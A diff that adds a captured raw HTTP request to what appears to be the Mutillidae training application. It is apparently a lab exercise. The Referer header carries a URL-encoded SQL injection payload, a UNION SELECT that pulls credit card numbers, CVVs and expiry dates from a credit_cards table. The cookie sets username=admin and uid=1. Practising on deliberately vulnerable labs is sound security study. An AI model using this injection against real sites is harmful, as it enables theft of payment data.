@@ -1,0 +1,13 @@
+GET /index.php?page=user-info.php&username=jeremy&password=adfakdfasdfasdkfhjads&user-info-php-submit-button=View+Account+Details HTTP/1.1
+Host: mutillidae.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://mutillidae.local/index.php?page=user-info.php&username=%27+union+select+1111%2Cccnumber%2Cccv%2Cexpiration%2C5555%2C6666%2C7777+from+mutillidae.credit_cards+%23&password=&user-info-php-submit-button=View+Account+Details
+Cookie: PHPSESSID=q78aafp8ei8ckh48p465sse7ss; showhints=1; username=admin; uid=1
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
